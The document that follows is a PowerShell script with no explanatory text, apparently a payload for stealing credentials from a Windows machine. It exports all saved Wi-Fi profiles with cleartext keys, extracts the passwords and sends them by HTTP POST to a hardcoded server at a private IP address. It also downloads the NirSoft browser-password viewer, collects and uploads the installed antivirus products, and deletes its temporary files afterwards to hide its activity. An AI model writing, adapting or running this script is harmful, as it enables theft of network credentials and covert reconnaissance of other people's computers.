$ServerUrl = 'http://10.0.0.237:3000/endpoint'

function Upload-Server {
    param (
        [string]$file,
        [string]$text
    )

    $content = Get-Content -Path $file -Raw
    $body = @{
        "content" = $content
        "text" = $text
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $ServerUrl -Method Post -Body $body -ContentType 'application/json'
}

function Get-Nirsoft {
    mkdir C:\temp 
    cd C:\temp
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip -DestinationPath C:\temp
    .\7z\7za.exe e C:\temp\wbpv.zip -oC:\temp
}

function Wifi {
    New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
    Set-Location -Path "$env:temp\js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
    Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $env:USERPROFILE\Desktop\0.txt
    Upload-Server -file "$env:USERPROFILE\Desktop\0.txt" -text "Wifi password :"
    Set-Location -Path "$env:temp"
    Remove-Item -Path "$env:temp\js2k3kd4nne5dhsk" -Force -Recurse
    Remove-Item -Path "$env:USERPROFILE\Desktop\0.txt"
}

function Del-Nirsoft-File {
    cd C:\
    Remove-Item -Path C:\temp -Force -Recurse
}

function version-av {
    mkdir C:\temp 
    cd C:\temp
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
    Upload-Server -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
    cd C:\
    Remove-Item -Path C:\temp -Force -Recurse
}

$desktop = ([Environment]::GetFolderPath("Desktop"))
Get-Nirsoft
Wifi
version-av
Del-Nirsoft-File
